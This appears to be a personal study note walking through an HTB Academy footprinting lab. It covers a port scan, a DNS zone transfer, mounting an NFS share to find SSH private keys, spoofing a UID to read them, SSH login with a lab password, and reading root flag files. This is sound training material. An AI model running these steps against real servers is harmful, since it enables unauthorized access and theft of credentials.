---
tags: [lab]
module: footprinting
last_updated: 2026-05-10
source_count: 1
---

# HTB Footprinting Lab — Easy

HTB Academy Footprinting module easy lab: internal DNS server enumeration using provided credentials and SSH key discovery via NFS.

## Target Info

- **Client**: Inlanefreight Ltd
- **Target**: Internal DNS server
- **Constraint**: No aggressive exploitation (production server)
- **Credentials provided**: `ceil:qwer1234`
- **Hint**: Employees discussed SSH keys on a forum
- **Goal**: Retrieve `flag.txt` from the server

## Approach / Methodology

This lab focuses on Layer 3 (Accessible Services) enumeration. The server is described as a DNS server, but the hint about SSH keys and the presence of `ceil:qwer1234` credentials suggests multiple services need to be examined.

### Phase 1: Initial Service Discovery

Start with a port scan to identify all accessible services:

```bash
sudo nmap -sV -sC -p- 10.129.x.x
```

Expected findings on an internal DNS server:
- TCP 22 (SSH)
- UDP/TCP 53 (DNS)
- TCP 111 (RPC portmapper — if NFS is running)
- TCP/UDP 2049 (NFS — the SSH key hint points here)

### Phase 2: DNS Enumeration

Query the DNS server to understand what it knows:

```bash
# Find name servers
dig ns inlanefreight.htb @10.129.x.x

# Attempt zone transfer (high priority — it's a DNS server)
dig axfr inlanefreight.htb @10.129.x.x

# Query internal zones found in zone transfer
dig axfr internal.inlanefreight.htb @10.129.x.x
```

A zone transfer on an internal DNS server frequently reveals the complete internal host inventory.

### Phase 3: NFS Enumeration (SSH Key Discovery)

The forum mention of SSH keys combined with the NFS hint suggests SSH keys are on an NFS share:

```bash
# Check NFS exports
showmount -e 10.129.x.x

# Mount the share
mkdir target-NFS
sudo mount -t nfs 10.129.x.x:/ ./target-NFS/ -o nolock

# List files with UIDs
ls -n target-NFS/

# Look for SSH keys
find target-NFS/ -name "id_rsa*" 2>/dev/null
ls -la target-NFS/home/
ls -la target-NFS/root/.ssh/ 2>/dev/null
```

### Phase 4: SSH Access with Key

If an `id_rsa` private key is found on the NFS share:

```bash
# Copy the key
cp target-NFS/.ssh/id_rsa ./id_rsa_ceil
chmod 600 ./id_rsa_ceil

# Login with the key
ssh -i id_rsa_ceil ceil@10.129.x.x
```

Alternatively, use the provided credentials directly:

```bash
ssh ceil@10.129.x.x
# Password: qwer1234
```

### Phase 5: Flag Retrieval

Once inside:

```bash
# Search for flag.txt
find / -name "flag.txt" 2>/dev/null

# Common locations
cat /home/ceil/flag.txt
cat /root/flag.txt
cat /flag.txt
```

## Key Techniques Used

1. **DNS zone transfer** — reveals internal naming structure
2. **NFS enumeration** — `showmount -e` to find shares
3. **SSH key from NFS** — UID-based access to key files on NFS share
4. **Credential reuse** — `ceil:qwer1234` works across services

## Lessons Learned

- Always attempt zone transfers immediately when you identify a DNS server — even if it's the stated target service, it may expose far more than expected.
- The "SSH keys discussed on a forum" hint is a direct pointer to NFS. NFS shares frequently contain `.ssh/` directories because developers rsync their home directories.
- NFS UID-based auth: if the SSH key is owned by UID 1000 and not readable, create a local user with UID 1000 and retry.
- Provided credentials (`ceil:qwer1234`) should be tested against every discovered service: SSH, FTP, web login, etc.

## Related Pages

- [[enumeration/dns]]
- [[enumeration/nfs]]
- [[tools/enumeration/dig]]

## Sources

- raw/footprinting/footprinting_lab_easy.md
